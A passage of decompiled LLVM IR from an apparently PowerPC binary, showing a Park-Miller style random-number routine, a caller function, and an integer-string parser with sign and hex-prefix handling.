  store i32 %v1_100089f8, i32* %r10.global-to-local, align 4
  %v2_10008a10 = add i32 %v2_10008a08, %v2_100089fc
  %v1_10008a14 = udiv i32 %v2_10008a10, 2
  store i32 %v1_10008a14, i32* %r9.global-to-local, align 4
  store i32 %v2_10008a10, i32* %v1_10008a08, align 4
  %v0_10008a1c = load i32, i32* %r9.global-to-local, align 4
  %v2_10008a1c = inttoptr i32 %arg2 to i32*
  store i32 %v0_10008a1c, i32* %v2_10008a1c, align 4
  br i1 %v2_10008a00, label %dec_label_pc_10008a2c, label %dec_label_pc_10008a24

dec_label_pc_10008a24:                            ; preds = %dec_label_pc_100089e8
  %v0_10008a24 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10008a24, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008a34

dec_label_pc_10008a2c:                            ; preds = %dec_label_pc_100089e8
  %v2_10008a04 = icmp ult i32 %v1_100089f8, %v3_100089f0
  br i1 %v2_10008a04, label %dec_label_pc_10008a34, label %dec_label_pc_10008a30

dec_label_pc_10008a30:                            ; preds = %dec_label_pc_10008a2c
  %v0_10008a30 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_10008a30, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008a34

dec_label_pc_10008a34:                            ; preds = %dec_label_pc_10008a2c, %dec_label_pc_10008a24, %dec_label_pc_10008a30
  %v0_10008a34 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10008a34, i32* %v2_100089ec, align 4
  %v0_10008a38 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_10008a38, i32* %arg1, align 4
  br label %dec_label_pc_10008a3c

dec_label_pc_10008a3c:                            ; preds = %dec_label_pc_100089cc, %dec_label_pc_10008a34
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10008a10, { 1, 0 }
  uselistorder i32 %v1_100089f8, { 1, 0 }
  uselistorder i32 %v3_100089ec, { 1, 0, 2 }
  uselistorder i32 %v1_100089d8, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008a3c, { 1, 0 }
  uselistorder label %dec_label_pc_10008a34, { 2, 0, 1 }
}

define i32 @function_10008a44() local_unnamed_addr {
dec_label_pc_10008a44:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_10008a44 = load i32, i32* @lr, align 4
  %v0_10008a50 = load i32, i32* @r4, align 4
  store i32 %v0_10008a50, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_10008a5c = add i32 %v0_10008a50, 12
  %v2_10008a5c = inttoptr i32 %v1_10008a5c to i32*
  %v3_10008a5c = load i32, i32* %v2_10008a5c, align 4
  %v2_10008a60 = icmp ugt i32 %v3_10008a5c, 4
  br i1 %v2_10008a60, label %dec_label_pc_10008b10, label %dec_label_pc_10008a68

dec_label_pc_10008a68:                            ; preds = %dec_label_pc_10008a44
  %v0_10008a68 = load i32, i32* @r3, align 4
  %v3_10008a68 = icmp eq i32 %v0_10008a68, 0
  %v1_10008a6c = add i32 %v0_10008a50, 8
  %v2_10008a6c = inttoptr i32 %v1_10008a6c to i32*
  %v3_10008a6c = load i32, i32* %v2_10008a6c, align 4
  store i32 %v3_10008a6c, i32* %r10.global-to-local, align 4
  br i1 %v3_10008a68, label %dec_label_pc_10008a74, label %dec_label_pc_10008a78

dec_label_pc_10008a74:                            ; preds = %dec_label_pc_10008a68
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_10008a78

dec_label_pc_10008a78:                            ; preds = %dec_label_pc_10008a68, %dec_label_pc_10008a74
  %v0_10008a7c = phi i32 [ %v0_10008a68, %dec_label_pc_10008a68 ], [ 1, %dec_label_pc_10008a74 ]
  %v3_10008a78 = icmp eq i32 %v3_10008a5c, 0
  %v2_10008a7c = inttoptr i32 %v3_10008a6c to i32*
  store i32 %v0_10008a7c, i32* %v2_10008a7c, align 4
  br i1 %v3_10008a78, label %dec_label_pc_10008b0c, label %dec_label_pc_10008a84

dec_label_pc_10008a84:                            ; preds = %dec_label_pc_10008a78
  %v0_10008a84 = load i32, i32* @r30, align 4
  %v1_10008a84 = add i32 %v0_10008a84, 16
  %v2_10008a84 = inttoptr i32 %v1_10008a84 to i32*
  %v3_10008a84 = load i32, i32* %v2_10008a84, align 4
  store i32 %v3_10008a84, i32* %r11.global-to-local, align 4
  store i32 127773, i32* %r8.global-to-local, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_10008a9c = load i32, i32* %r10.global-to-local, align 4
  store i32 %v3_10008a84, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_10008a84, 0
  br i1 %tmp18, label %dec_label_pc_10008ad8.preheader, label %dec_label_pc_10008ad8.preheader.thread

dec_label_pc_10008ad8.preheader.thread:           ; preds = %dec_label_pc_10008a84
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10008adc

dec_label_pc_10008ad8.preheader:                  ; preds = %dec_label_pc_10008a84
  %v1_10008ad82 = add i32 %v3_10008a84, -1
  store i32 %v1_10008ad82, i32* %ctr.global-to-local, align 4
  %v2_10008ad83 = icmp eq i32 %v1_10008ad82, 0
  br i1 %v2_10008ad83, label %dec_label_pc_10008adc, label %dec_label_pc_10008ab4

dec_label_pc_10008ab4:                            ; preds = %dec_label_pc_10008ad8.preheader, %dec_label_pc_10008ad4.dec_label_pc_10008ab4_crit_edge
  %v1_10008ad4 = phi i32 [ %v2_10008ad4, %dec_label_pc_10008ad4.dec_label_pc_10008ab4_crit_edge ], [ %v0_10008a9c, %dec_label_pc_10008ad8.preheader ]
  %v1_10008ab4 = phi i32 [ %v1_10008ab4.pre, %dec_label_pc_10008ad4.dec_label_pc_10008ab4_crit_edge ], [ 127773, %dec_label_pc_10008ad8.preheader ]
  %v0_10008ab4 = load i32, i32* @r3, align 4
  %v2_10008ab4 = sdiv i32 %v0_10008ab4, %v1_10008ab4
  %v2_10008ab8 = mul i32 %v2_10008ab4, %v1_10008ab4
  %v2_10008abc = sub i32 %v0_10008ab4, %v2_10008ab8
  %v1_10008ac0 = mul i32 %v2_10008ab4, 2836
  store i32 %v1_10008ac0, i32* %r0.global-to-local, align 4
  %v1_10008ac4 = mul i32 %v2_10008abc, 16807
  %v2_10008ac8 = sub i32 %v1_10008ac4, %v1_10008ac0
  store i32 %v2_10008ac8, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_10008ac8, -1
  br i1 %tmp19, label %dec_label_pc_10008ad4, label %dec_label_pc_10008ad0

dec_label_pc_10008ad0:                            ; preds = %dec_label_pc_10008ab4
  %v1_10008ad0 = load i32, i32* %r7.global-to-local, align 4
  %v2_10008ad0 = add i32 %v1_10008ad0, %v2_10008ac8
  store i32 %v2_10008ad0, i32* @r3, align 4
  br label %dec_label_pc_10008ad4

dec_label_pc_10008ad4:                            ; preds = %dec_label_pc_10008ab4, %dec_label_pc_10008ad0
  %v0_10008ad4 = phi i32 [ %v2_10008ac8, %dec_label_pc_10008ab4 ], [ %v2_10008ad0, %dec_label_pc_10008ad0 ]
  %v2_10008ad4 = add i32 %v1_10008ad4, 4
  %v3_10008ad4 = inttoptr i32 %v2_10008ad4 to i32*
  store i32 %v0_10008ad4, i32* %v3_10008ad4, align 4
  %v0_10008ad8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008ad8 = add i32 %v0_10008ad8, -1
  store i32 %v1_10008ad8, i32* %ctr.global-to-local, align 4
  %v2_10008ad8 = icmp eq i32 %v1_10008ad8, 0
  br i1 %v2_10008ad8, label %dec_label_pc_10008ad8.dec_label_pc_10008adc_crit_edge, label %dec_label_pc_10008ad4.dec_label_pc_10008ab4_crit_edge

dec_label_pc_10008ad4.dec_label_pc_10008ab4_crit_edge: ; preds = %dec_label_pc_10008ad4
  %v1_10008ab4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008ab4

dec_label_pc_10008ad8.dec_label_pc_10008adc_crit_edge: ; preds = %dec_label_pc_10008ad4
  %v0_10008adc.pre = load i32, i32* @r30, align 4
  %v0_10008ae0.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10008ae4.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008adc

dec_label_pc_10008adc:                            ; preds = %dec_label_pc_10008ad8.preheader.thread, %dec_label_pc_10008ad8.dec_label_pc_10008adc_crit_edge, %dec_label_pc_10008ad8.preheader
  %v0_10008ae4 = phi i32 [ %v0_10008ae4.pre, %dec_label_pc_10008ad8.dec_label_pc_10008adc_crit_edge ], [ %v0_10008a9c, %dec_label_pc_10008ad8.preheader ], [ %v0_10008a9c, %dec_label_pc_10008ad8.preheader.thread ]
  %v0_10008ae0 = phi i32 [ %v0_10008ae0.pre, %dec_label_pc_10008ad8.dec_label_pc_10008adc_crit_edge ], [ %v3_10008a84, %dec_label_pc_10008ad8.preheader ], [ %v3_10008a84, %dec_label_pc_10008ad8.preheader.thread ]
  %v1_10008ae4 = phi i32 [ %v0_10008adc.pre, %dec_label_pc_10008ad8.dec_label_pc_10008adc_crit_edge ], [ %v0_10008a84, %dec_label_pc_10008ad8.preheader ], [ %v0_10008a84, %dec_label_pc_10008ad8.preheader.thread ]
  %v1_10008adc = add i32 %v1_10008ae4, 20
  %v2_10008adc = inttoptr i32 %v1_10008adc to i32*
  %v3_10008adc = load i32, i32* %v2_10008adc, align 4
  store i32 %v3_10008adc, i32* %r0.global-to-local, align 4
  %v1_10008ae0 = mul i32 %v0_10008ae0, 10
  store i32 %v1_10008ae0, i32* %r31.global-to-local, align 4
  %v2_10008ae4 = add i32 %v1_10008ae4, 4
  %v3_10008ae4 = inttoptr i32 %v2_10008ae4 to i32*
  store i32 %v0_10008ae4, i32* %v3_10008ae4, align 4
  %v0_10008ae8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008ae8 = mul i32 %v0_10008ae8, 4
  %v0_10008aec = load i32, i32* %r10.global-to-local, align 4
  %v2_10008aec = add i32 %v0_10008aec, %v1_10008ae8
  store i32 %v2_10008aec, i32* %r0.global-to-local, align 4
  %v1_10008af0 = load i32, i32* @r30, align 4
  %v2_10008af0 = inttoptr i32 %v1_10008af0 to i32*
  store i32 %v2_10008aec, i32* %v2_10008af0, align 4
  %v2_10008b04 = ptrtoint i32* %stack_var_-24 to i32
  %v0_10008afc21 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008afc22 = add i32 %v0_10008afc21, -1
  store i32 %v1_10008afc22, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_10008afc22, -1
  br i1 %tmp2025, label %dec_label_pc_10008af8, label %dec_label_pc_10008b0c

dec_label_pc_10008af8:                            ; preds = %dec_label_pc_10008adc, %dec_label_pc_10008af8
  %v0_10008b0026 = load i32, i32* @r30, align 4
  %v2_10008af8 = inttoptr i32 %v0_10008b0026 to i32*
  %v3_10008af8 = call i32 @function_100089b4(i32* %v2_10008af8, i32 %v2_10008b04)
  %v0_10008afc = load i32, i32* @r31, align 4
  %v1_10008afc = add i32 %v0_10008afc, -1
  store i32 %v1_10008afc, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_10008afc, -1
  br i1 %tmp20, label %dec_label_pc_10008af8, label %dec_label_pc_10008b0c

dec_label_pc_10008b0c:                            ; preds = %dec_label_pc_10008adc, %dec_label_pc_10008af8, %dec_label_pc_10008a78
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10008b10

dec_label_pc_10008b10:                            ; preds = %dec_label_pc_10008a44, %dec_label_pc_10008b0c
  %v0_10008b10 = phi i32 [ -1, %dec_label_pc_10008a44 ], [ 0, %dec_label_pc_10008b0c ]
  store i32 %v0_10008a44, i32* %r0.global-to-local, align 4
  ret i32 %v0_10008b10

; uselistorder directives
  uselistorder i32 %v1_10008ad8, { 1, 0 }
  uselistorder i32 %v2_10008ad4, { 1, 0 }
  uselistorder i32 %v2_10008ac8, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10008ab4, { 1, 0 }
  uselistorder i32 %v0_10008a9c, { 1, 2, 0 }
  uselistorder i32 %v3_10008a84, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r10.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ctr.global-to-local, { 0, 2, 3, 4, 1 }
  uselistorder label %dec_label_pc_10008b10, { 1, 0 }
  uselistorder label %dec_label_pc_10008b0c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10008af8, { 1, 0 }
  uselistorder label %dec_label_pc_10008adc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10008ad4, { 1, 0 }
  uselistorder label %dec_label_pc_10008ab4, { 1, 0 }
  uselistorder label %dec_label_pc_10008a78, { 1, 0 }
}

define i32 @function_10008b28(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10008b28:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10008b28 = icmp ugt i32 %arg2, 127
  %v0_10008b30 = load i32, i32* @lr, align 4
  store i32 %v0_10008b30, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v1_10008b3c = sub i32 255, %arg2
  %v2_10008b3c = sub i32 -1, %arg2
  %not.v5_10008b3c = icmp ugt i32 %v1_10008b3c, %v2_10008b3c
  %v6_10008b40 = sext i1 %not.v5_10008b3c to i32
  store i32 %tmp, i32* %r27.global-to-local, align 4
  %v1_10008b48 = add i32 %tmp, 4
  store i32 %v1_10008b48, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000f1dc.281 to i32), i32* %r11.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  %v1_10008b60 = sub nsw i32 3, %v6_10008b40
  store i32 %v1_10008b60, i32* @r31, align 4
  br i1 %v2_10008b28, label %dec_label_pc_10008b88, label %dec_label_pc_10008b68

dec_label_pc_10008b68:                            ; preds = %dec_label_pc_10008b28
  %v2_10008b54 = icmp ugt i32 %arg2, 31
  %v1_10008b68 = sub i32 63, %arg2
  %not.v5_10008b68 = icmp ugt i32 %v1_10008b68, %v2_10008b3c
  %v6_10008b6c = sext i1 %not.v5_10008b68 to i32
  %v1_10008b74 = sub nsw i32 1, %v6_10008b6c
  store i32 %v1_10008b74, i32* @r31, align 4
  br i1 %v2_10008b54, label %dec_label_pc_10008b88, label %dec_label_pc_10008b7c

dec_label_pc_10008b7c:                            ; preds = %dec_label_pc_10008b68
  store i32 22, i32* %r28.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  %tmp5 = icmp ult i32 %arg2, 8
  br i1 %tmp5, label %dec_label_pc_10008be8, label %dec_label_pc_10008b88

dec_label_pc_10008b88:                            ; preds = %dec_label_pc_10008b7c, %dec_label_pc_10008b68, %dec_label_pc_10008b28
  %v0_10008b88 = phi i32 [ 0, %dec_label_pc_10008b7c ], [ %v1_10008b74, %dec_label_pc_10008b68 ], [ %v1_10008b60, %dec_label_pc_10008b28 ]
  %v1_10008b88 = mul nsw i32 %v0_10008b88, 4
  store i32 %v1_10008b88, i32* %r0.global-to-local, align 4
  %v2_10008b8c = add i32 %arg3, 12
  %v3_10008b8c = inttoptr i32 %v2_10008b8c to i32*
  store i32 %v0_10008b88, i32* %v3_10008b8c, align 4
  %v0_10008b90 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008b90 = load i32, i32* %r11.global-to-local, align 4
  %v2_10008b90 = add i32 %v1_10008b90, %v0_10008b90
  store i32 %v2_10008b90, i32* %r9.global-to-local, align 4
  %v3_10008b94 = inttoptr i32 %v2_10008b90 to i32*
  %v4_10008b94 = load i32, i32* %v3_10008b94, align 4
  store i32 %v4_10008b94, i32* %r0.global-to-local, align 4
  %v1_10008b98 = add i32 %v2_10008b90, 20
  %v2_10008b98 = inttoptr i32 %v1_10008b98 to i32*
  %v3_10008b98 = load i32, i32* %v2_10008b98, align 4
  store i32 %v3_10008b98, i32* %r9.global-to-local, align 4
  %v1_10008b9c = load i32, i32* %r30.global-to-local, align 4
  %v2_10008b9c = add i32 %v1_10008b9c, 20
  %v3_10008b9c = inttoptr i32 %v2_10008b9c to i32*
  store i32 %v4_10008b94, i32* %v3_10008b9c, align 4
  %v0_10008ba0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008ba0 = mul i32 %v0_10008ba0, 4
  store i32 %v1_10008ba0, i32* %r0.global-to-local, align 4
  %v0_10008ba4 = load i32, i32* %r29.global-to-local, align 4
  %v1_10008ba4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008ba4 = add i32 %v1_10008ba4, 8
  %v3_10008ba4 = inttoptr i32 %v2_10008ba4 to i32*
  store i32 %v0_10008ba4, i32* %v3_10008ba4, align 4
  %v0_10008ba8 = load i32, i32* %r29.global-to-local, align 4
  %v1_10008ba8 = load i32, i32* %r0.global-to-local, align 4
  %v2_10008ba8 = add i32 %v1_10008ba8, %v0_10008ba8
  store i32 %v2_10008ba8, i32* %r0.global-to-local, align 4
  %v0_10008bac = load i32, i32* %r9.global-to-local, align 4
  %v1_10008bac = load i32, i32* %r30.global-to-local, align 4
  %v2_10008bac = add i32 %v1_10008bac, 16
  %v3_10008bac = inttoptr i32 %v2_10008bac to i32*
  store i32 %v0_10008bac, i32* %v3_10008bac, align 4
  %v0_10008bb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008bb0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10008bb0 = add i32 %v1_10008bb0, 24
  %v3_10008bb0 = inttoptr i32 %v2_10008bb0 to i32*
  store i32 %v0_10008bb0, i32* %v3_10008bb0, align 4
  store i32 268471224, i32* @lr, align 4
  %v0_10008bb4 = call i32 @function_10008a44()
  %v0_10008bb8 = load i32, i32* @r31, align 4
  %v3_10008bb8 = icmp eq i32 %v0_10008bb8, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10008bc4 = load i32, i32* %r27.global-to-local, align 4
  %v2_10008bc4 = inttoptr i32 %v1_10008bc4 to i32*
  store i32 0, i32* %v2_10008bc4, align 4
  br i1 %v3_10008bb8, label %dec_label_pc_10008bfc, label %dec_label_pc_10008bcc

dec_label_pc_10008bcc:                            ; preds = %dec_label_pc_10008b88
  %v0_10008bcc = load i32, i32* @r30, align 4
  %v1_10008bcc = add i32 %v0_10008bcc, 4
  %v2_10008bcc = inttoptr i32 %v1_10008bcc to i32*
  %v3_10008bcc = load i32, i32* %v2_10008bcc, align 4
  %v0_10008bd0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10008bd0 = sub i32 %v3_10008bcc, %v0_10008bd0
  %v4_10008bd4 = sdiv i32 %v2_10008bd0, 4
  %v1_10008bd8 = mul i32 %v4_10008bd4, 5
  %v1_10008bdc = load i32, i32* @r31, align 4
  %v2_10008bdc = add i32 %v1_10008bd8, %v1_10008bdc
  store i32 %v2_10008bdc, i32* %r0.global-to-local, align 4
  %v1_10008be0 = load i32, i32* %r27.global-to-local, align 4
  %v2_10008be0 = inttoptr i32 %v1_10008be0 to i32*
  store i32 %v2_10008bdc, i32* %v2_10008be0, align 4
  br label %dec_label_pc_10008bfc

dec_label_pc_10008be8:                            ; preds = %dec_label_pc_10008b7c
  %v0_10008be8 = call i32 @function_10004e38()
  store i32 %v0_10008be8, i32* %r3.global-to-local, align 4
  %v0_10008bec = load i32, i32* %r28.global-to-local, align 4
  %v2_10008bec = inttoptr i32 %v0_10008be8 to i32*
  store i32 %v0_10008bec, i32* %v2_10008bec, align 4
  %v0_10008bf0 = call i32 @function_10004e38()
  %v0_10008bf4 = load i32, i32* %r28.global-to-local, align 4
  %v2_10008bf4 = inttoptr i32 %v0_10008bf0 to i32*
  store i32 %v0_10008bf4, i32* %v2_10008bf4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008bfc

dec_label_pc_10008bfc:                            ; preds = %dec_label_pc_10008b88, %dec_label_pc_10008bcc, %dec_label_pc_10008be8
  store i32 %v0_10008b30, i32* %r0.global-to-local, align 4
  %v0_10008c0c = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008c0c

; uselistorder directives
  uselistorder i32 %v2_10008b90, { 1, 0, 2 }
  uselistorder i32 %v0_10008b88, { 1, 0 }
  uselistorder i32 %v2_10008b3c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 ()* @function_10008a44, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000f1dc.281 to i32), { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 5, 4 }
  uselistorder label %dec_label_pc_10008bfc, { 2, 1, 0 }
}

define i32 @function_10008c10(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008c10:
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 10, i32* %r30.global-to-local, align 4
  store i32 1, i32* %r26.global-to-local, align 4
  store i32 %tmp, i32* %r31.global-to-local, align 4
  %v3_10008c48 = load i32, i32* @global_var_1001044c, align 4
  br label %dec_label_pc_10008c54

dec_label_pc_10008c50:                            ; preds = %dec_label_pc_10008c54
  %v1_10008c50 = add i32 %v0_10008c88, 1
  store i32 %v1_10008c50, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008c54

dec_label_pc_10008c54:                            ; preds = %dec_label_pc_10008c10, %dec_label_pc_10008c50
  %v0_10008c88 = phi i32 [ %tmp, %dec_label_pc_10008c10 ], [ %v1_10008c50, %dec_label_pc_10008c50 ]
  %v1_10008c54 = inttoptr i32 %v0_10008c88 to i8*
  %v2_10008c54 = load i8, i8* %v1_10008c54, align 1
  %v3_10008c54 = zext i8 %v2_10008c54 to i32
  %v1_10008c58 = mul nuw nsw i32 %v3_10008c54, 2
  %v2_10008c5c = add i32 %v1_10008c58, %v3_10008c48
  %v3_10008c5c = inttoptr i32 %v2_10008c5c to i16*
  %v4_10008c5c = load i16, i16* %v3_10008c5c, align 2
  %v1_10008c60 = and i16 %v4_10008c5c, 32
  %v3_10008c60 = icmp eq i16 %v1_10008c60, 0
  br i1 %v3_10008c60, label %dec_label_pc_10008c68, label %dec_label_pc_10008c50

dec_label_pc_10008c68:                            ; preds = %dec_label_pc_10008c54
  %v3_10008c68 = icmp eq i8 %v2_10008c54, 43
  br i1 %v3_10008c68, label %dec_label_pc_10008c88, label %dec_label_pc_10008c70

dec_label_pc_10008c70:                            ; preds = %dec_label_pc_10008c68
  %v3_10008c70 = icmp eq i8 %v2_10008c54, 45
  store i32 0, i32* %r28.global-to-local, align 4
  br i1 %v3_10008c70, label %dec_label_pc_10008c88, label %dec_label_pc_10008c8c

dec_label_pc_10008c88:                            ; preds = %dec_label_pc_10008c68, %dec_label_pc_10008c70
  %storemerge = phi i32 [ 1, %dec_label_pc_10008c70 ], [ 0, %dec_label_pc_10008c68 ]
  store i32 %storemerge, i32* %r28.global-to-local, align 4
  %v1_10008c88 = add i32 %v0_10008c88, 1
  store i32 %v1_10008c88, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008c8c

dec_label_pc_10008c8c:                            ; preds = %dec_label_pc_10008c70, %dec_label_pc_10008c88
  %v1_10008c8c = call i32 @__asm_rlwinm.(i32 10, i32 0, i32 28, i32 26)
  %v4_10008c8c = icmp eq i32 %v1_10008c8c, 0
  br i1 %v4_10008c8c, label %dec_label_pc_10008c98, label %dec_label_pc_10008c8c.dec_label_pc_10008cd4_crit_edge

dec_label_pc_10008c8c.dec_label_pc_10008cd4_crit_edge: ; preds = %dec_label_pc_10008c8c
  %v0_10008cd4.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008cd4

dec_label_pc_10008c98:                            ; preds = %dec_label_pc_10008c8c
  %v0_10008c98 = load i32, i32* %r31.global-to-local, align 4
  %v1_10008c98 = inttoptr i32 %v0_10008c98 to i8*
  %v2_10008c98 = load i8, i8* %v1_10008c98, align 1
  %v0_10008c9c = load i32, i32* %r30.global-to-local, align 4
  %v1_10008c9c = add i32 %v0_10008c9c, 10
  store i32 %v1_10008c9c, i32* %r30.global-to-local, align 4
  %v3_10008ca0 = icmp eq i8 %v2_10008c98, 48
  br i1 %v3_10008ca0, label %dec_label_pc_10008ca8, label %dec_label_pc_10008cc8

dec_label_pc_10008ca8:                            ; preds = %dec_label_pc_10008c98
  %v1_10008ca8 = add i32 %v0_10008c98, 1
  %v2_10008ca8 = inttoptr i32 %v1_10008ca8 to i8*
  %v3_10008ca8 = load i8, i8* %v2_10008ca8, align 1
  %v4_10008ca8 = zext i8 %v3_10008ca8 to i32
  store i32 %v1_10008ca8, i32* %r31.global-to-local, align 4
  %v1_10008cac = add i32 %v0_10008c9c, 8
  store i32 %v1_10008cac, i32* %r30.global-to-local, align 4
  %v1_10008cb0 = or i32 %v4_10008ca8, 32
  %v3_10008cb8 = icmp eq i32 %v1_10008cb0, 120
  br i1 %v3_10008cb8, label %dec_label_pc_10008cc0, label %dec_label_pc_10008cc8

dec_label_pc_10008cc0:                            ; preds = %dec_label_pc_10008ca8
  %v1_10008cc0 = mul i32 %v1_10008cac, 2
  store i32 %v1_10008cc0, i32* %r30.global-to-local, align 4
  %v1_10008cc4 = add i32 %v0_10008c98, 2
  store i32 %v1_10008cc4, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008cc8

dec_label_pc_10008cc8:                            ; preds = %dec_label_pc_10008ca8, %dec_label_pc_10008c98, %dec_label_pc_10008cc0
  %v0_10008d7c15 = phi i32 [ %v1_10008ca8, %dec_label_pc_10008cc0 ], [ %tmp, %dec_label_pc_10008c98 ], [ %v1_10008ca8, %dec_label_pc_10008ca8 ]
  %v0_10008cc8 = phi i32 [ %v1_10008cc0, %dec_label_pc_10008cc0 ], [ %v1_10008c9c, %dec_label_pc_10008c98 ], [ %v1_10008cac, %dec_label_pc_10008ca8 ]
  %tmp22 = icmp slt i32 %v0_10008cc8, 17
  br i1 %tmp22, label %dec_label_pc_10008cd4, label %dec_label_pc_10008cd0

dec_label_pc_10008cd0:                            ; preds = %dec_label_pc_10008cc8
  store i32 16, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10008cd4

dec_label_pc_10008cd4:                            ; preds = %dec_label_pc_10008c8c.dec_label_pc_10008cd4_crit_edge, %dec_label_pc_10008cc8, %dec_label_pc_10008cd0
  %v0_10008d7c14 = phi i32 [ %tmp, %dec_label_pc_10008c8c.dec_label_pc_10008cd4_crit_edge ], [ %v0_10008d7c15, %dec_label_pc_10008cc8 ], [ %v0_10008d7c15, %dec_label_pc_10008cd0 ]
  %v1_10008ce8 = phi i32 [ %v0_10008cd4.pre, %dec_label_pc_10008c8c.dec_label_pc_10008cd4_crit_edge ], [ %v0_10008cc8, %dec_label_pc_10008cc8 ], [ 16, %dec_label_pc_10008cd0 ]
  %v1_10008cd4 = add i32 %v1_10008ce8, -2
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_10008cdc = icmp ugt i32 %v1_10008cd4, 34
  br i1 %v2_10008cdc, label %dec_label_pc_10008d74, label %dec_label_pc_10008ce4

dec_label_pc_10008ce4:                            ; preds = %dec_label_pc_10008cd4
  %v2_10008ce8 = udiv i32 -1, %v1_10008ce8
  store i32 %v2_10008ce8, i32* %r29.global-to-local, align 4
  %v2_10008cec = mul i32 %v2_10008ce8, %v1_10008ce8
  %v1_10008cf0 = sub i32 -1, %v2_10008cec
  %v1_10008cf4 = urem i32 %v1_10008cf0, 256
  store i32 %v1_10008cf4, i32* %r27.global-to-local, align 4
  %v0_10008d00.pre = load i32, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008d00

dec_label_pc_10008cfc:                            ; preds = %dec_label_pc_10008d68, %dec_label_pc_10008d50
  %v1_10008d04.pre = phi i32 [ %v1_10008d08, %dec_label_pc_10008d68 ], [ %v1_10008d04.pre.pre, %dec_label_pc_10008d50 ]
  %v0_10008d04.pre = phi i32 [ %v2_10008d6c, %dec_label_pc_10008d68 ], [ %v0_10008d04.pre.pre, %dec_label_pc_10008d50 ]
  %v0_10008cfc = phi i32 [ %v1_10008d0c, %dec_label_pc_10008d68 ], [ %v0_10008cfc.pre, %dec_label_pc_10008d50 ]
  br label %dec_label_pc_10008d00

dec_label_pc_10008d00:                            ; preds = %dec_label_pc_10008ce4, %dec_label_pc_10008cfc
